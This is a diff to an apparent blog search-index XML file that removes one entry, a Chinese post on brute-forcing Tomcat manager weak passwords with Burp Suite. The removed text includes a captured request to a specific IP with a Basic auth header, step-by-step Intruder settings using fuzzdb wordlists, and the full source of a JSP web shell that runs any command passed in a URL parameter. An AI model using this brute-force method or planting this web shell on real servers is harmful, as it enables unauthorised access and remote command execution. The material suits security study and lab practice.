@@ -175,25 +175,6 @@
   
   
   <entry>
-    <title>burpsuit爆破tomcat弱口令</title>
-    <link href="/2020/05/14/burpsuit/"/>
-    <url>/2020/05/14/burpsuit/</url>
-    
-    <content type="html"><![CDATA[<h2 id="1-爆破过程"><a href="#1-爆破过程" class="headerlink" title="1.爆破过程"></a>1.爆破过程</h2><pre><code class="hljs groovy">GET <span class="hljs-regexp">/manager/</span>html HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">Host:</span> <span class="hljs-number">183.129</span><span class="hljs-number">.189</span><span class="hljs-number">.60</span>:<span class="hljs-number">10003</span>Cache-<span class="hljs-string">Control:</span> max-age=<span class="hljs-number">0</span><span class="hljs-string">Authorization:</span> Basic cm9vdDoxMjM0NTY=Upgrade-Insecure-<span class="hljs-string">Requests:</span> <span class="hljs-number">1</span>User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-regexp">/81.0.4044.138 Safari/</span><span class="hljs-number">537.36</span><span class="hljs-string">Accept:</span> text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>webp,image<span class="hljs-regexp">/apng,*/</span>*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><span class="hljs-string">Referer:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//183.129.189.60:10003/</span>Accept-<span class="hljs-string">Encoding:</span> gzip, deflateAccept-<span class="hljs-string">Language:</span> zh-CN,zh;q=<span class="hljs-number">0.9</span>,en;q=<span class="hljs-number">0.8</span><span class="hljs-string">Cookie:</span> JSESSIONID=<span class="hljs-number">8</span>DA41A6A354785CE74C11ADCDB2EA6E4; BEEFHOOK=a47BzAqiV2jYspK3XZUFy0OJKfQOC8Fow6buWl2rFhOEDnEE0HjKEgzQ178zDMFLSI9JDDTjWutfnOM1; SL_G_WPT_TO=eo; SL_GWPT_Show_Hide_tmp=<span class="hljs-number">1</span>; SL_wptGlobTipTmp=<span class="hljs-number">1</span>; JSESSIONID=<span class="hljs-number">7</span>FA5D5CD237346D1D889B0CDFA2ACF55<span class="hljs-string">Connection:</span> close</code></pre><p>上述是返回的报文</p><p>解码Authorization得到admin:admin</p><p>选择右侧的add$</p><p>payload里选择自定义</p><p>payload options中position选择1是用户名字典，2是：，3是密码字典</p><p>随后encode选择base64</p><p>取消勾选URL-encode</p><p>开始爆破</p><p><a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">获取字典</a></p><p>本文使用的是其中的tomcat default users 和 pass的两个字典，外加常用密码字典</p><h2 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2.利用过程"></a>2.利用过程</h2><p>小马代码：</p><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.util.*,java.io.*"</span>%&gt;&lt;%<span class="hljs-comment">//</span><span class="hljs-comment">// JSP_KIT</span><span class="hljs-comment">//</span><span class="hljs-comment">// cmd.jsp = Command Execution (unix)</span><span class="hljs-comment">//</span><span class="hljs-comment">// by: Unknown</span><span class="hljs-comment">// modified: 27/06/2003</span><span class="hljs-comment">//</span>%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=<span class="hljs-string">"GET"</span> NAME=<span class="hljs-string">"myform"</span> ACTION=<span class="hljs-string">""</span>&gt;&lt;INPUT TYPE=<span class="hljs-string">"text"</span> NAME=<span class="hljs-string">"cmd"</span>&gt;&lt;INPUT TYPE=<span class="hljs-string">"submit"</span> VALUE=<span class="hljs-string">"Send"</span>&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%<span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">"cmd"</span>) != <span class="hljs-keyword">null</span>) &#123;        out.println(<span class="hljs-string">"Command: "</span> + request.getParameter(<span class="hljs-string">"cmd"</span>) + <span class="hljs-string">"&lt;BR&gt;"</span>);        Process p = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">"cmd"</span>));        OutputStream os = p.getOutputStream();        InputStream in = p.getInputStream();        DataInputStream dis = <span class="hljs-keyword">new</span> DataInputStream(in);        String disr = dis.readLine();        <span class="hljs-keyword">while</span> ( disr != <span class="hljs-keyword">null</span> ) &#123;                out.println(disr);                 disr = dis.readLine();                 &#125;        &#125;%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;</code></pre>]]></content>
-    
-    
-    
-    <tags>
-      
-      <tag>web安全</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>记一次csrf实验</title>
     <link href="/2020/05/13/csrf/"/>
     <url>/2020/05/13/csrf/</url>
